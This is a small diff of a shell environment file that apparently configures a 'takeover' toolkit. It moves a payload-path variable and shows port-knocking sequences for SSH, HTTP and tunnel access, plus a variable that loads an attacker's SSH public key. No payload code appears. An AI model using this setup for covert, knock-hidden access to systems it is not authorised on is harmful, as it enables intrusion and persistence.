@@ -10,6 +10,9 @@ export KNOCK_OPEN_TUNNEL="11114 22224"
 export KNOCK_DELAY=50
 export SERVER_TUNNEL_PORT=9999
 
+# Server specific
+export PAYLOAD_PATH="takeover/payload/payload.sh"
+
 # This is for knockd format
 export KNOCK_OPEN_SSH_D=$(echo $KNOCK_OPEN_SSH | tr ' ' ',')
 export KNOCK_CLOSE_SSH_D=$(echo $KNOCK_CLOSE_SSH | tr ' ' ',')
@@ -17,8 +20,6 @@ export KNOCK_OPEN_HTTP_D=$(echo $KNOCK_OPEN_HTTP | tr ' ' ',')
 export KNOCK_OPEN_HTTPS_D=$(echo $KNOCK_OPEN_HTTPS | tr ' ' ',')
 export KNOCK_OPEN_TUNNEL_D=$(echo $KNOCK_OPEN_TUNNEL | tr ' ' ',')
 
-# Server specific
-export PAYLOAD_PATH="takeover/payload/payload.sh"
 
 # Files
 export ATTACKER_PUBLIC_KEY=$(cat ssh/ATTACKER.pub)
